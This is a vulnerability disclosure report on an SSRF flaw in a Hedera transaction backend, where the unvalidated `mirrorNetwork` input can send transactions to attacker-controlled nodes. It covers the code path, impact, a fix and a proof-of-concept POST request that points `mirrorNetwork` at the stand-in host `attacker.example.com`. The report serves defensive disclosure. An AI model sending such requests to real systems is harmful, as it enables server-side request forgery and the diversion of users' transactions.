### Title
Unvalidated `mirrorNetwork` Input Enables SSRF and Attacker-Controlled Node Routing

### Summary
The `mirrorNetwork` field in `CreateTransactionDto` is accepted as a free-form string with no allowlist validation. Any authenticated user can supply an arbitrary URL, causing the backend to make outbound gRPC connections to an attacker-controlled server via `getClientFromNetwork`. The attacker-controlled server can return a crafted address book, redirecting subsequent transaction execution to attacker-controlled Hedera nodes. The malicious `mirrorNetwork` value is also persisted to the database and re-used during every execution attempt.

### Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` declares `mirrorNetwork` as:

```ts
@IsNotEmpty()
@IsString()
mirrorNetwork: string;
``` [1](#0-0) 

The only constraints are non-empty and string type. No check against the set of known networks (`mainnet`, `testnet`, `previewnet`, `local-node`) is performed.

**Code path — arbitrary URL reaches outbound gRPC:**

`TransactionsController.createTransaction` (guarded by JWT + `VerifiedUserGuard`) calls `TransactionsService.createTransaction`, which immediately calls:

```ts
const client = await getClientFromNetwork(dtos[0].mirrorNetwork);
``` [2](#0-1) 

Inside `getClientFromNetwork`, when the value is not one of the four known constants, execution falls to the default branch:

```ts
const client = Client.forNetwork({}).setMirrorNetwork(
  MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0]),
);
const nodeAddressBook = await new AddressBookQuery()
  .setFileId(FileId.ADDRESS_BOOK)
  .execute(client);          // ← outbound gRPC to attacker host
client.setNetworkFromAddressBook(nodeAddressBook);
``` [3](#0-2) 

`MirrorNetworkGRPC.fromBaseURL` for an unknown value simply appends `:443` and returns the attacker-supplied hostname:

```ts
default:
  return [mirrorNetwork.endsWith(':443') ? mirrorNetwork : `${mirrorNetwork}:443`];
``` [4](#0-3) 

**Persistence and re-use during execution:**

The raw `mirrorNetwork` string is stored in the database:

```ts
mirrorNetwork: data.mirrorNetwork,
``` [5](#0-4) 

`_executeTransaction` later reads it back and calls `getClientFromNetwork` again, triggering a second outbound connection to the attacker's server at execution time:

```ts
const client = await getClientFromNetwork(transaction.mirrorNetwork);
``` [6](#0-5) 

### Impact Explanation

1. **SSRF**: The backend makes an outbound gRPC/TLS connection to any host:443 the attacker names. This can be used to probe internal services (e.g., cloud metadata endpoints, internal APIs) that are reachable from the backend container but not from the public internet.

2. **Attacker-controlled node routing**: The attacker's server returns a crafted `NodeAddressBook` pointing to attacker-controlled Hedera node addresses. The SDK client is then configured with those addresses via `setNetworkFromAddressBook`. All subsequent transaction submissions for that stored record are sent to the attacker's nodes. The attacker's nodes can silently drop transactions, causing them to time out and fail, or observe transaction content (though they cannot forge signatures).

3. **Persistent effect**: Because `mirrorNetwork` is stored in the database, the SSRF and routing manipulation persist across the full transaction lifecycle (creation → signing → execution), not just the initial request.

### Likelihood Explanation

The attacker must hold a valid, verified organization account (JWT + `VerifiedUserGuard`). This is a "malicious normal user" scenario explicitly listed as in-scope in `RESEARCHER.md`. Registration is a standard user flow; no privileged access is required. The attack requires a single crafted `POST /transactions` request. [7](#0-6) 

### Recommendation

Add an allowlist check in `CreateTransactionDto` or at the service boundary before `getClientFromNetwork` is called. Reject any `mirrorNetwork` value that is not one of the four known constants or does not pass a strict hostname/URL validation policy defined by the operator. Example using `class-validator`:

```ts
@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])
// OR for custom networks, use @Matches with a strict FQDN regex
mirrorNetwork: string;
```

If custom mirror nodes must be supported, maintain a server-side allowlist of approved custom endpoints rather than accepting arbitrary user input.

### Proof of Concept

**Precondition**: Attacker has a valid JWT for a verified organization user. Attacker controls a server at `attacker.example.com` listening on port 443 that speaks the Hedera mirror node gRPC protocol (or any gRPC server that returns a crafted `NodeAddressBook`).

**Steps**:

1. Attacker sends:
   ```http
   POST /transactions
   Authorization: Bearer <valid_jwt>
   Content-Type: application/json

   {
     "name": "test",
     "description": "test",
     "transactionBytes": "<valid_signed_tx_hex>",
     "creatorKeyId": <attacker_key_id>,
     "signature": "<valid_sig_hex>",
     "mirrorNetwork": "attacker.example.com"
   }
   ```

2. Backend calls `getClientFromNetwork("attacker.example.com")`.

3. `MirrorNetworkGRPC.fromBaseURL("attacker.example.com")` returns `["attacker.example.com:443"]`.

4. Backend executes `AddressBookQuery` against `attacker.example.com:443` — outbound gRPC connection confirmed on attacker's server.

5. Attacker's server returns a crafted `NodeAddressBook` with attacker-controlled node IPs.

6. `client.setNetworkFromAddressBook(nodeAddressBook)` configures the SDK client with attacker nodes.

7. `mirrorNetwork: "attacker.example.com"` is persisted to the database.

8. When the chain service later calls `_executeTransaction`, it repeats steps 2–6 and submits the transaction to attacker-controlled nodes, which can drop it silently.

**Expected outcome**: Attacker receives an inbound gRPC connection from the backend server (confirming SSRF), and the transaction is routed to attacker-controlled nodes for execution.
